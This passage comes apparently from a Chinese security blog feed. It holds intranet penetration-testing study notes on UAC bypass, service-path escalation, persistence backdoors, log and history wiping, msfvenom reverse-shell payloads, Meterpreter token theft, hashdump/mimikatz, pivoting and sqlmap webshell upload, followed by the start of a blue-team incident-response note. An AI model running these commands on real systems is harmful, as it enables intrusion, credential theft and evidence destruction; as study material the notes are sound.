UAC。当加载某些较高完整性级别进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL,这些DLL包含导致会话权限提升的payload。此模块修改注册表项，但在调用payload后将清除该项,这个模块需要payload的体系架构和操作系统匹配，但是当前的低权限meterpreter会话体系架构中可能不同。如果指定exe:：custom，则应在单独的进程中启动payloa后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件,因此，如果cmd.exe访问受到限制，此模块将无法正常运行。</span><br><br><span class="hljs-comment">#Powershell</span><br>Invoke-PsUACme<br><br><span class="hljs-comment">#Empire</span><br>usemodule privesc/bypassuac<br>usemodule privesc/bypassuac_wscript<br><br><span class="hljs-comment">#cs</span><br>uac-dll<br>uac-token-duplication<br></code></pre></td></tr></table></figure><h3 id="操作系统配置错误"><a href="#操作系统配置错误" class="headerlink" title="操作系统配置错误"></a>操作系统配置错误</h3><blockquote><p>管理员凭证配置错误<br>服务配置错误<br>故意削弱的安全措施<br>用户权限过高</p></blockquote><h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><ol><li>sc 命令提权（administrator–&gt;system）</li></ol><p>例如：<code>sc Create syscmd binPath= “cmd /K start” type= own type=interactsc start systcmd</code> 就得到了一个 system 权限的 cmd 环境</p><ol><li>不带引号的服务路径</li></ol><p>当服务路径带空格的时候，路径空格目录前面一断就会当作文件执行，如 <code>C:\ProgramFiles\MSBuild</code> 这个目录，攻击者只要在 c 盘创建名为 <code>Program.exe</code> 的木马，最后只要系统重启就会执行 <code>C:\Program.exe</code> 文件。</p><ol><li>不安全的服务权限提升</li></ol><p>由于管理配置错误，用户可能对服务拥有过多的权限，例如用木马替换服务调用的默认文件。</p><ol><li>数据库提权</li><li>访问令牌提权</li></ol><h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><blockquote><p>预加载型动态链接库后门<br>strace 后门<br>SSH 后门<br>SUID 后门<br>inetd 服务后门<br>协议后门<br>vim 后门<br>PAM 后门<br>进程注入<br>Rootkit<br>端口复用</p></blockquote><h2 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h2><blockquote><p>替换系统文件类(shift 后门,放大镜后门)<br>修改注册表类<br>自启动项、屏幕保护程序注册表、用户登陆初始化、登录脚本、映像劫持、影子账户、AppCertDlls 注册表项、AppInit_DLLs 注册表项、文件关联、用户登陆初始化、xx.Netsh Helper DLL<br>文件类<br>自启动文件夹、office Word StartUp 劫持<br>计划任务<br>schtasks 、WMI、bitsadmin</p></blockquote><h1 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h1><p>1.查看事件日志 run event_manager -i</p><p>2.删除事件日志 run event_manager -c</p><p>3.clearv 命令清除目标系统的事件日志。</p><p>清除命令历史记录</p><p>histroy -r          #删除当前会话历史记录</p><p>history -c          #删除内存中的所有命令历史</p><p>rm .bash_history   #删除历史文件中的内容</p><p>HISTZISE&#x3D;0          #通过设置历史命令条数来清除所有历史记录</p><p>在隐蔽的位置执行命令</p><p>使用 vim 打开文件执行命令</p><p>:set history&#x3D;0</p><p>:!command</p><p>linux 日志文件</p><p>&#x2F;var&#x2F;run&#x2F;utmp 记录现在登入的用户</p><p>&#x2F;var&#x2F;log&#x2F;wtmp 记录用户所有的登入和登出</p><p>&#x2F;var&#x2F;log&#x2F;lastlog 记录每一个用户最后登入时间</p><p>&#x2F;var&#x2F;log&#x2F;btmp 记录错误的登入尝试</p><p>&#x2F;var&#x2F;log&#x2F;auth.log 需要身份确认的操作</p><p>&#x2F;var&#x2F;log&#x2F;secure 记录安全相关的日志信息</p><p>&#x2F;var&#x2F;log&#x2F;maillog 记录邮件相关的日志信息</p><p>&#x2F;var&#x2F;log&#x2F;message 记录系统启动后的信息和错误日志</p><p>&#x2F;var&#x2F;log&#x2F;cron 记录定时任务相关的日志信息</p><p>&#x2F;var&#x2F;log&#x2F;spooler 记录 UUCP 和 news 设备相关的日志信息</p><p>&#x2F;var&#x2F;log&#x2F;boot.log 记录守护进程启动和停止相关的日志消息</p><p>完全删除日志文件：</p><p>cat &#x2F;dev&#x2F;null &gt; filename</p><p>: &gt; filename</p><p>filename</p><p>echo “” &gt; filename</p><p>echo &gt; filename</p><p>针对性删除日志文件：</p><p>删除当天日志</p><p>sed  -i ‘&#x2F;当天日期&#x2F;‘d  filename</p><p>一键清除脚本：</p><p>!&#x2F;usr&#x2F;bin&#x2F;bash</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;syslog</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;messages</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_log</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;xferlog</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;secure</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;auth.log</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;user.log</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;wtmp</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;lastlog</p><p>echo &gt; &#x2F;var&#x2F;log&#x2F;btmp</p><p>echo &gt; &#x2F;var&#x2F;run&#x2F;utmp</p><p>rm ~&#x2F;.&#x2F;bash_history</p><p>history -c</p><p>Linux</p><p>Windows</p><h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><blockquote><p><a href="https://blog.csdn.net/weixin_45588247/article/details/119614618">https://blog.csdn.net/weixin_45588247&#x2F;article&#x2F;details&#x2F;119614618</a><br><a href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></p></blockquote><h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/QqhVb8pD4oClfixKgowcNisJnqd.png" alt="截图"></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/VpEBbVXlVoCXg4xyKjqclkTynhe.png" alt="截图"></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/VRxLbPbLboDpcKxJHhsc1fvInzh.png" alt="截图"></p><p>其中：meterpreter 组件（stage）是一种基于内存 DDL 注入的后渗透工具</p><h3 id="模块分类"><a href="#模块分类" class="headerlink" title="模块分类"></a>模块分类</h3><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/EhyrbLCxVo3pzpxRZ76cK92yn8e.png" alt="截图"></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/WFZ3bTsvBoBdzJxD1ZlcmCL2nhc.png" alt="截图"></p><h4 id="Auxiliary-扫描器"><a href="#Auxiliary-扫描器" class="headerlink" title="Auxiliary 扫描器"></a>Auxiliary 扫描器</h4><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/SLR6bjrYhoDHAHxgiZocgSCpn5g.png" alt="截图"></p><h4 id="攻击载荷和编码"><a href="#攻击载荷和编码" class="headerlink" title="攻击载荷和编码"></a>攻击载荷和编码</h4><p>这里利用 msfvemon 来替代</p><blockquote><p>msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f elf &gt; shell.elf<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f exe &gt; shell.exe<br>-p 指定 payload<br>-e 编码器<br>-i 迭代器<br>-f 输出格式</p></blockquote><h4 id="POST-后渗透"><a href="#POST-后渗透" class="headerlink" title="POST 后渗透"></a>POST 后渗透</h4><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/IX6Ubug2FohidmxFGMqc3WY6nuf.png" alt="截图"></p><h3 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h3><h4 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h4><p>这个就不多写了</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/E7orbUVrtoPXw5xMZThcwo2YnNg.png" alt="截图"></p><h4 id="后渗透-windows"><a href="#后渗透-windows" class="headerlink" title="后渗透(windows)"></a>后渗透(windows)</h4><blockquote><p><a href="https://cloud.tencent.com/developer/article/1180234">https://cloud.tencent.com/developer/article/1180234</a></p></blockquote><h5 id="一-创建会话"><a href="#一-创建会话" class="headerlink" title="一.创建会话"></a>一.创建会话</h5><p><a href="https://blog.csdn.net/weixin_44823747/article/details/110056175">https://blog.csdn.net/weixin_44823747&#x2F;article&#x2F;details&#x2F;110056175</a></p><p>1.通过-l 参数来查看可以生成的 payload</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/SlULb9DgDoMK6WxHkwzcWP9onMf.png" alt="截图"></p><p>其中可以分为三类，二进制文件，webshell 和脚本 shell</p><p>2.反弹 shell 建立如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f elf &gt; shell.elf<br>msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure><p>然后运行 exploit&#x2F;multi&#x2F;handler 监听模块并且在靶机上运行脚本即可</p><p>3.cmdshell–&gt;meterpreter</p><p>sessions 查看会话类型，如果是 cmdshell 可以选择输入 session -u id 来升级 然后 sessions id 进入会话</p><p>收集信息</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> arp_scanner -r  c段ip  查看主机状态<br><span class="hljs-built_in">run</span> post/multi/recon/local_exploit_suggester      查看msf的提权<br></code></pre></td></tr></table></figure><h5 id="二-提权"><a href="#二-提权" class="headerlink" title="二.提权"></a>二.提权</h5><h6 id="1-绕过-UAC"><a href="#1-绕过-UAC" class="headerlink" title="1.绕过 UAC"></a>1.绕过 UAC</h6><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/EeXObrz16oc7RpxMmuOc9d8Intc.png" alt="截图"></p><p>这里输入 background 挂起会话，使用 MSF 中的模块直接进行提权，在会话中输入 getsystem 即可</p><h6 id="2-系统漏洞"><a href="#2-系统漏洞" class="headerlink" title="2.系统漏洞"></a>2.系统漏洞</h6><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><h5 id="三-进程迁移"><a href="#三-进程迁移" class="headerlink" title="三.进程迁移"></a>三.进程迁移</h5><p>将 msf 和进程进行绑定来降低被杀的概率</p><p>1.查看进程 getpid</p><p>2.查看正在运行进程 ps</p><p>3.绑定 migratepid id</p><h5 id="四-令牌假冒"><a href="#四-令牌假冒" class="headerlink" title="四.令牌假冒"></a>四.令牌假冒</h5><p>令牌：windows 提供的一个类似于 cookies 的功能，用来分辨用户身份，如果域管理员登陆过这个终端，那可以直接假冒域管理员</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss">查看当前用户 getuid<br>进入模块 <span class="hljs-keyword">use</span> incognito<br>查看存在的令牌 list_tokens-u<br>伪造 impersonate_token <span class="hljs-built_in">token</span>\\用户名<br></code></pre></td></tr></table></figure><h5 id="五-获取凭证"><a href="#五-获取凭证" class="headerlink" title="五.获取凭证"></a>五.获取凭证</h5><p>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者 hash，再尝试登录内网其它服务器</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">取出密码 <span class="hljs-built_in">run</span> hashdump<br>使用mimikatz模块<br>wdigest抓内存中的明文<br>kiwi模块<br></code></pre></td></tr></table></figure><h5 id="六-端口转发"><a href="#六-端口转发" class="headerlink" title="六.端口转发"></a>六.端口转发</h5><h6 id="portfwd"><a href="#portfwd" class="headerlink" title="portfwd"></a>portfwd</h6><p>portfwd -l 本地端口 -r 内网 ip -p 内网端口</p><h6 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h6><p>1.添加路由表 route add 内网 ip 子网掩码 sessionid （route print 查看）</p><p>2.socks 代理</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/GNT1bbDYfoMl88xO6VAcECbfnUh.png" alt="截图"></p><h5 id="七-后门"><a href="#七-后门" class="headerlink" title="七.后门"></a>七.后门</h5><h6 id="metsvc-服务启动"><a href="#metsvc-服务启动" class="headerlink" title="metsvc(服务启动)"></a>metsvc(服务启动)</h6><h6 id="persistant"><a href="#persistant" class="headerlink" title="persistant"></a>persistant</h6><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs diff">nmap hostname/ip或者多个ip或者子网192.168.123.*<br><span class="hljs-deletion">-iL ip.txt 扫描ip.txt的所有ip</span><br><span class="hljs-deletion">-A 包含了-sV，-O，探测操作系统信息和路由跟踪（激烈扫描，一般不用）</span><br><span class="hljs-deletion">-O 探测操作系统信息</span><br><span class="hljs-deletion">-sV 查找主机服务版本号</span><br><span class="hljs-deletion">-sA 探测该主机是否使用了包过滤器或防火墙（建议使用wafw00f）</span><br><span class="hljs-deletion">-sS 半开扫描，一般不会记入日志，不过需要root权限。</span><br><span class="hljs-deletion">-sT TCP connect扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。</span><br><span class="hljs-deletion">-sP ping扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。</span><br><span class="hljs-deletion">-Pn 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。</span><br><span class="hljs-deletion">-sN TCP空扫描 </span><br><span class="hljs-deletion">-F 快速扫描</span><br><span class="hljs-deletion">-p 指定端口/端口范围</span><br><span class="hljs-deletion">-oN 将报告写入文件</span><br><span class="hljs-deletion">-v 详细信息</span><br><span class="hljs-deletion">-T&lt;0-5&gt; 设定速度</span><br>使用脚本：<br><span class="hljs-deletion">--script all 使用所有脚本</span><br><span class="hljs-deletion">--script=sql.injection.nse sql注入</span><br><span class="hljs-deletion">--script=&quot;smb*&quot; 扫smb系列</span><br>一、4 大功能：分别为主机发现（参数-sn）、端口扫描(-sS -sU)、版本侦测(–sV)、OS侦测(-O)<br>二、扫描方式有：tcp connect()、TCP SYN scanning、TCP FIN scanning、Nullscan等<br>三、绕过 ping 扫描参数为：nmap -Pn XXX.XXX.XXX.XXX<br>四、漏洞检测可直接 nmap 目标 --script=auth,vuln<br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/PHLcb9Jq5oj1JaxXkx7cGZT3n4e.png" alt="截图"></p><p>四扫：（sn 扫主机）</p><p>半开扫端口-sT –minrate 10000 -p-</p><p>udp 扫端口 -sU -p-</p><p>扫详细（服务版本，默认脚本，系统版本） -sT -sV -sC -O -p</p><p>漏洞扫描 –scipt&#x3D;vulnW</p><p>nmap 默认使用-sS 只发送 syn 标志位进行扫描，快但是不如-sT 准确，同时 S 容易受到防火墙过滤不完整的包</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Dr2LbBwm2o4G9Dx3kKQcEySpn6f.png" alt="截图"></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/PFVzbM6RzoMJlFxbMUec1oe7nB2.png" alt="截图"></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Hn54bBGLRoNU3Ex2c6hcyE4lnkf.png" alt="截图"></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/NFb1b7l4goaJW0xWReBcBvuXnSf.png" alt="截图"></p><h2 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a><strong>SQLmap</strong></h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-u 单个URL <br>-m xx<span class="hljs-selector-class">.txt</span> 多个URL<br>-d <span class="hljs-string">&quot;mysql://user:password@10.10.10.137:3306/dvwa&quot;</span> 作为服务器客户端，连接数据库<br><span class="hljs-attr">--data</span> post/get都适用<br>-<span class="hljs-selector-tag">p</span> 指定扫描的参数<br>-r 读取文件<br>-f 指纹信息<br><span class="hljs-attr">--tamper</span> 混淆脚本，用于应用层过滤<br><span class="hljs-attr">--cookie</span> <span class="hljs-attr">--user-agent</span> <span class="hljs-attr">--host</span> 对http头的修改<br><span class="hljs-attr">--threads</span> 并发线程，默认为<span class="hljs-number">1</span><br><span class="hljs-attr">--dbms</span> MySQL&lt;<span class="hljs-number">5.0</span>&gt; 指定数据库或版本<br>–level=LEVEL 执行测试的等级（<span class="hljs-number">1</span>-<span class="hljs-number">5</span>，默认为 <span class="hljs-number">1</span>）<br>–risk=RISK 执行测试的风险（<span class="hljs-number">0</span>-<span class="hljs-number">3</span>，默认为 <span class="hljs-number">1</span>） Risk升高可造成数据被篡改等风险<br>–current-db 获取当前数据库名称<br>–dbs 枚举数据库管理系统数据库<br>–tables 枚举 DBMS 数据库中的表<br>–<span class="hljs-attribute">columns</span> 枚举 DBMS 数据库表列<br>-D DB 要进行枚举的数据库名<br>-T TBL 要进行枚举的数据库表<br>-C COL 要进行枚举的数据库列<br>-U USER 用来进行枚举的数据库用户<br>常用的tamper：<br>base64encode<span class="hljs-selector-class">.py</span> 转为b64编码<br>charencode<span class="hljs-selector-class">.py</span> url编码<br>chardoubleencode<span class="hljs-selector-class">.py</span> 双URL编码<br>unmagicquotes<span class="hljs-selector-class">.py</span> 宽字节<br>randomcomments<span class="hljs-selector-class">.py</span> 用<br>`<span class="hljs-comment">/**/</span><br>`分割SQL关键字<br>space2plus<span class="hljs-selector-class">.py</span> space2comment<span class="hljs-selector-class">.py</span> space2xxxx<span class="hljs-selector-class">.py</span> 替换空格为xx<br>Post注入：<br>sqlmap -r <span class="hljs-string">&quot;数据包地址&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;参数&quot;</span> -dbms 数据类型<br>Get注入：<br>sqlmap -u <span class="hljs-string">&quot;注入点地址&quot;</span> <span class="hljs-attr">--dbms</span> 参数<br>sqlmap进行交互式写shell：<br><span class="hljs-number">1</span>-前提条件：最高权限、知道web网站绝对路径、能获取到cookie<br><span class="hljs-number">2</span>-sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;注入点地址&quot;</span> <span class="hljs-attr">--cookie</span>=<span class="hljs-string">&quot;cookie值&quot;</span> <span class="hljs-attr">--os-shell</span><br>-echo “一句话木马”&gt;网站的绝对路径<br><span class="hljs-number">3</span>-输入web网站的绝对路径<br><span class="hljs-number">4</span>-传木马<br></code></pre></td></tr></table></figure><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a><strong>wireshark</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">过滤源<span class="hljs-built_in"> ip </span>地址:ip.<span class="hljs-attribute">src</span>==1.1.1.1;,<br>目的<span class="hljs-built_in"> ip </span>地址:ip.<span class="hljs-attribute">dst</span>==1.1.1.1;<br>过滤 80 端口:tcp.<span class="hljs-attribute">port</span>==80,<br>源端口:tcp.<span class="hljs-attribute">srcport</span>==80,<br>目的端口:tcp.<span class="hljs-attribute">dstport</span>==80<br>协议直接输入,如 http 协议 http<br>过滤 get/post 包 http.request.<span class="hljs-attribute">mothod</span>==”GET/POST”<br></code></pre></td></tr></table></figure><h1 id="弹-shell"><a href="#弹-shell" class="headerlink" title="弹 shell"></a>弹 shell</h1><p>reg 上传去正向连接。或探测出网协议，如 dns，icmp</p><h2 id="windows-2"><a href="#windows-2" class="headerlink" title="windows"></a>windows</h2><h4 id="一-有回显出网"><a href="#一-有回显出网" class="headerlink" title="一.有回显出网"></a>一.有回显出网</h4><p>1.通过特殊文件路径确认路径写 shell</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/XjC3bSVDLolaifxWRJNcpdBknRf.png" alt="截图"></p><p>2.远程下载并执行</p><p>3.添加账号</p><h4 id="二-有回显不出网"><a href="#二-有回显不出网" class="headerlink" title="二.有回显不出网"></a>二.有回显不出网</h4><p>1.确认 web 应用路径写 shell</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/XrmybeEptoGazFxaS96c073hnnd.png" alt="截图"></p><h4 id="三-无回显出网"><a href="#三-无回显出网" class="headerlink" title="三.无回显出网"></a>三.无回显出网</h4><p>1.通过特殊文件，将路径写入某个文件写入同目录 txt 文件后查看</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/BMIlbyPCaoT0jtxdQrvcC5IynDg.png" alt="截图"></p><p>2.将路径发送给 DNSLOG</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ORE7b8VR3oGUt0xjtgkcUjL1niz.png" alt="截图"></p><p>或者直接写命令</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/IdYgbdOP0ownRTxfxMZcrcnZnrX.png" alt="截图"></p><h4 id="四-无回显不出网"><a href="#四-无回显不出网" class="headerlink" title="四.无回显不出网"></a>四.无回显不出网</h4><p>同上确认路径</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/VUiUbeBpHoq4WzxhShyc2yhEnyF.png" alt="截图"></p><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h4 id="一-出网"><a href="#一-出网" class="headerlink" title="一.出网"></a>一.出网</h4><p>反弹 shell</p><h4 id="二-不出网"><a href="#二-不出网" class="headerlink" title="二.不出网"></a>二.不出网</h4><h4 id="-3"><a href="#-3" class="headerlink" title=""></a></h4>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>蓝队笔记</title>
    <link href="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>通篇摘录，尚待学习&#x3D; &#x3D;</p><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><blockquote><p><a href="https://bypass007.github.io/Emergency-Response-Notes/Summary/">https://bypass007.github.io/Emergency-Response-Notes/Summary/</a></p></blockquote><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/image-20240627161826663.png" alt="image-20240627161826663"></p><blockquote><p><a href="https://mp.weixin.qq.com/s/APfr2ctaq1GHNpJeSxQ3EQ">https://mp.weixin.qq.com/s/APfr2ctaq1GHNpJeSxQ3EQ</a></p></blockquote><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/TVzebfwneormWox5u6Rc5RM0ne6.png" alt="截图"></p><h3 id="应急前沟通"><a href="#应急前沟通" class="headerlink" title="应急前沟通"></a>应急前沟通</h3><blockquote><p>现场现象是什么?如何发现的?(依据是什么) ?<br>什么时候发现的?<br>目前是否有做物理隔离(断网) ?<br>受害机器是哪个?<br>受害服务有几台?(1 台&#x2F;N 台)<br>最先发现是哪台 ?<br>这台服务器对外有哪些服务?<br>这台服务器于其他机器是否处于同一个内网?<br>操作系统类型?<br>是否有公网映射业务?<br>远程管理方式?<br>网络边界有没有流量监控设备?<br>主机侧是否有 EDR 等安全设备</p></blockquote><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/image-20240627162018816.png" alt="image-20240627162018816"></p><h3 id="问题处置"><a href="#问题处置" class="headerlink" title="问题处置"></a>问题处置</h3><blockquote><p>事件判断:判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DDoS等等。以及安全事件的危害程度 </p><p>临时处置:给出客户临时处置建议，断网隔离，保护现场环境，切断供给链</p><p>深入分析:收集客户信息和中毒主机信息，包括<strong>样本，日志分析、进程分析、启动项分析、样本分析</strong>。 </p><p>清理处置:直接杀掉进程，删除文件，打补丁，抑或是修复文件。 产出报告:整理并输出完整的安全事件报告</p></blockquote><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/FcYTbAtNmorqJ7x0WQpctu9onac.png" alt="截图"></p><h2 id="事件分析"><a href="#事件分析" class="headerlink" title="事件分析"></a>事件分析</h2><h3 id="Web-攻击"><a href="#Web-攻击" class="headerlink" title="Web 攻击"></a><strong>Web 攻击</strong></h3><p><strong>相关表现:</strong> 页面被篡改、恶意推广、黑词黑页、webshell<br><strong>相关危害:</strong> 导致搜索引擎告警、微信等 app 分享告警、首页敏感内容、拖库、内网沦陷等排查<br><strong>要点:</strong> 能否多个环境下复现异常现象;确定相关资产是否存在;恶意文件是否确实存在于服务器上<br><strong>操作要点:</strong> 备份文件;webshell 后门查杀;web 日志分析;web 中间件缓存处理;web 中间件配置检查;重启 web 中间件;服务器后门检查;<br><strong>防护措施:</strong> 加固相关 web 应用，修改相关系统的所有用户密码</p><h3 id="链路劫持"><a href="#链路劫持" class="headerlink" title="链路劫持"></a><strong>链路劫持</strong></h3><p><strong>相关表现:</strong> 区域性服务不可用或返回异常内容<br><strong>相关危害:</strong> 导致搜索引擎告警、微信等 app 分享告警、首页敏感内容等<br><strong>排查要点:</strong> 能否多个环境下复现异常现象;确定相关资产是否存在;恶意文件是否确实存在于服务器上<br><strong>操作要点:</strong> 跨地区、运营商进行测试，确定受影响范围:在能复现的环境中判断是 DNS 劫持还是 HTTP 劫持<br><strong>防护措施:</strong> 重要业务部署 https</p><h3 id="代理隧道"><a href="#代理隧道" class="headerlink" title="代理隧道"></a><strong>代理隧道</strong></h3><p><strong>相关表现:</strong> 持续性或间断性外连行为，通常为 tcp 协议，对内网多个主机有访问行为<br><strong>相关危害:</strong> 作为跳板机攻击其他内网资产<br><strong>排查要点:</strong> 确定存在代理隧道的跳板机，通常为某时间段内集中访问内网多种资源的机器，判断隧道类型<br><strong>防护措施:</strong> 完善内网 acl，服务器按业务需要通过白名单策略访问外网</p><h3 id="替换系统命令"><a href="#替换系统命令" class="headerlink" title="替换系统命令"></a><strong>替换系统命令</strong></h3><p><strong>相关表现:</strong> 无明显表现<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:窃取账号、密码等重要凭证<br><strong>排查要点:</strong> 使用包管理自带的包校验功能验证文件完整性，分析恶意文件行为，确定影响面<br><strong>操作要点:</strong> 使用静态链接的 busybox;重新安装被替换的包<br><strong>命令:</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 